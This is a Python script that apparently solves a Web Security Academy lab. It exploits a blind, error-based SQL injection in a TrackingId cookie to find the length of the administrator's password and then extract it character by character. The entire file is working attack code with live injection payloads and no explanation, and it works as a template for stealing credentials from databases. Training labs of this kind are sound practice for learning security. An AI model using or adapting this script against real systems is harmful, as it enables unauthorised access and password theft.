import requests
import string


url = "https://ac671f441eb7f9e3c01f64bf002100bb.web-security-academy.net/filter?category=Food+%26+Drink"
size_pwd = 0
aux_cont = 0
print('= Verify size of password =')
while True:
    aux_cont = aux_cont + 1
    exploit_sizepassword =f"7v20Gr7e9SvJXSG0'||(SELECT CASE WHEN LENGTH(password)>{aux_cont} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
    cookie = {
        "TrackingId":exploit_sizepassword, 
        "session":"DpYzdTK6qYrghyDp8Z1MUn2D11NLfDjG"
    }
    s = requests.Session()
    r = s.get(url, cookies=cookie)
    if r.status_code == 500:
        size_pwd = size_pwd + 1
    else:
        break
    #print (r.status_code)
    s.close()

print (f'Password_size = {size_pwd+1} characters')
pwd_final = size_pwd+1

password = list('')
leter = string.ascii_lowercase + string.digits
leters = list(leter)
print('= Stealing password =')
while True:
    for character in leters:
        position = len(password) + 1
        exploit_password =f"7v20Gr7e9SvJXSG0'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        cookie = {
            "TrackingId":exploit_password, 
            "session":"DpYzdTK6qYrghyDp8Z1MUn2D11NLfDjG"
        }
        r = requests.get(url, cookies=cookie)
        if r.status_code == 500:
            password.append(character)
            break
        #print(f"Password = {''.join(password) + character}")
    if position == (pwd_final+1):
        break

print(f"Final Password: {''.join(password)}")